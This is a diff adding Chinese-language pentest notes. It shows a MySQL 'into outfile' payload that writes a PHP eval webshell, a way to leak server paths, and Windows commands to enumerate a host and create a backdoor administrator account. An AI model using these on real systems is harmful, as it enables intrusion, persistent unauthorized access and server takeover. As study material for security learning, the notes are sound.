@@ -626,9 +626,46 @@ and 1=ctxsys.drithsx.sn(1,(select banner from sys.v$version where rownum=1))-- �
 
 
 
+## 使用SQL获取Webshell
 
+Mysql导出函数：[将数据库里的内容导出]
 
+```sql
+into outfile
 
+into dumpfile # 可以写16进制写入
+```
+
+当知道绝对路径的时候，且可以导出权限开启的时候就可以拿到webshell
+
+`id=7 union select 1,'<?php eval($_REQUEST[8])?>' into outfile 'c:/phpstudy/www/125.php'`
+
+关键就在于如何获取这个绝对路径。简单的网站可以用这个方法：乱输入一些参数进去使其数据库报错，就会出现绝对路径。不过真实情况下基本不会遇见
+
+当获取到webshell以后的第一件事情就是查看当前用户的权限
+
+一共有两个步骤
+
+* 先`whoami`查看当前用户
+* 再`net localgroup administrators`
+
+第二个步骤的作用是查看当前服务器内的管理员名单，如果里面没有whoami的用户。那就证明你获取的权限依旧不是最高，需要进行提权。
+
+[提权辅助网站](https://i.hacking8.com/tiquan)
+
+使用这个网站可以进行辅助提权，下面介绍一些Windows端的命令
+
+```windows
+netstat -ano # 查看当前开放的所有端口
+
+tasklist	 # 查看当前所有进程
+
+systeminfo   # 查看当前系统的所有信息
+
+net user name p@ssw0rd /all # 创建账号
+
+net localgroup administrators name /add # 将某个用户添加到管理员权限
+```
 
 
 
